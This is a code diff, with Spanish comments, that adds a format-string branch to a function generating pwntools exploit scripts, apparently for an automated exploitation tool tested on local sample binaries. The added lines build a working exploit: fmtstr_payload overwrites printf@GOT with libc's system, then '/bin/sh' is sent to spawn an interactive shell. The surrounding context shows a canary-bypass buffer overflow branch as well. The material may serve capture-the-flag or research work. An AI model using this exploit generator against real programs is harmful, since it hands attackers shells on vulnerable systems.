@@ -3078,6 +3078,25 @@ def _pwn_script(c) -> str:
                 ("align = p64(ROP(elf).find_gadget(['ret']).address)" if needs_align else "align = b''"),
                 "io.send(b'A' * BUFSZ + p64(canary) + b'A' * RBPGAP + align + p64(WIN))",
                 "io.interactive()"]
+    elif "format-string" in strat:
+        # Bug real encontrado en vivo contra samples/bin/fmt_got: aqui "offset" NO es una distancia
+        # de buffer a RIP (lo que la rama generica de abajo asume con flat({OFFSET: ...})) sino el
+        # indice %N$p del argumento de printf controlado por el usuario -- lo que fmtstr_payload()
+        # necesita. Reutilizar el `system` observado en el sandbox tambien seria fragil (su libc
+        # puede diferir de la de este entorno); como el script corre localmente contra EL MISMO
+        # binario, se recalcula via elf.libc igual que el driver verificado de autofmt.py.
+        got = pr.get("got")
+        body = [f"OFFSET = {off}", f"PRINTF_GOT = {got}",
+                "libc = io.libc  # libc.address correcto segun /proc/<pid>/maps DEL PROCESO YA",
+                "# ABIERTO; elf.libc.symbols daria el offset estatico dentro del fichero",
+                "# (address=0), no la direccion real en tiempo de ejecucion -- confirmado en",
+                "# vivo: con elf.libc el %n escribia basura y el programa moria con SIGSEGV",
+                "system = libc.symbols['system']",
+                "payload = fmtstr_payload(OFFSET, {PRINTF_GOT: system}, write_size='byte')",
+                "io.sendline(payload)             # printf(payload) -> printf@GOT = system",
+                "io.recvrepeat(0.5)",
+                "io.sendline(b'/bin/sh')          # printf('/bin/sh') -> system('/bin/sh')",
+                "io.interactive()"]
     elif "pie" in strat:
         body = [f"OFFSET = {off}",
                 f"# PIE: base observada en el sandbox (ASLR off) = {base}",
